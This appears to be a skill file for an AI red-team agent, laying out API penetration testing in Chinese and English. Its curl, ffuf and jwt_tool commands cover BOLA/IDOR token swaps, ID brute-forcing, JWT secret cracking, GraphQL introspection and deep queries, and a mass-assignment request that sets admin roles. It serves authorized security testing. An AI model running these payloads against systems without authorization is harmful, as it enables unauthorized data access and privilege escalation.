---
name: api-security
description: >-
  Tests REST/GraphQL/JWT APIs for BOLA/IDOR, broken auth, mass assignment, and
  GraphQL introspection—recording raw requests in runs/. Use when user mentions
  API/GraphQL/JWT/越权/BOLA/接口爆破/swagger/openapi.
whenToUse: 发现 /api/、GraphQL endpoint、Bearer JWT、或 Swagger/Postman 导出
role: vuln-scan
enabled: true
---

# API 安全测试（REST + GraphQL + JWT）

## 标准流程

### 1. 发现与文档

```bash
mkdir -p runs/api-TARGET
curl -s "http://TARGET/swagger.json" -o runs/api-TARGET/swagger.json
curl -s "http://TARGET/v2/api-docs" -o runs/api-TARGET/api-docs.json
curl -s "http://TARGET/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' -o runs/api-TARGET/introspect.json
```

### 2. BOLA / IDOR

```bash
# 替换资源 ID（用户 A token 访问用户 B）
curl -s -H "Authorization: Bearer TOKEN_A" \
  "http://TARGET/api/users/USER_B_ID" -o runs/api-TARGET/bola.txt
# 批量 ID
ffuf -u "http://TARGET/api/orders/FUZZ" -w runs/id-list.txt -H "Authorization: Bearer TOKEN" \
  -mc 200 -o runs/api-TARGET/orders-ffuf.csv -of csv
```

### 3. JWT 弱点

```bash
# alg:none / 弱密钥 — 用 jwt_tool（如有）
jwt_tool TOKEN -C -d wordlists/jwt-secrets.txt
# 改 role/uid claims 后重签（知 secret 时）
```

### 4. GraphQL

```bash
# 深度/批量查询 DoS 风险（轻量测）
curl -s "http://TARGET/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query { users { id email orders { id items { name } } } }"}' \
  -o runs/api-TARGET/deep-query.txt
```

### 5. Mass assignment

```bash
curl -s -X PATCH "http://TARGET/api/profile" -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"x","role":"admin","isAdmin":true}' -o runs/api-TARGET/mass-assign.txt
```

## 与其它技能的分工

| 场景 | 技能 |
|---|---|
| 传统 Web 表单 SQLi | `sqli-testing` |
| 登录逻辑绕过 | `auth-bypass` |
| 接口目录发现 | `dir-bruteforce` |

## 输出与落库

1. `redteam_vuln_add` — type=`api`, subtype=bola|jwt|graphql|mass-assign
2. `redteam_chain_add` — 完整 HTTP 请求（含 headers）

## 纪律

1. GraphQL introspection 在生产演练中可能禁开——失败则改字典爆破字段名
2. 不批量导出全站 PII；样例 1–3 条即可证明
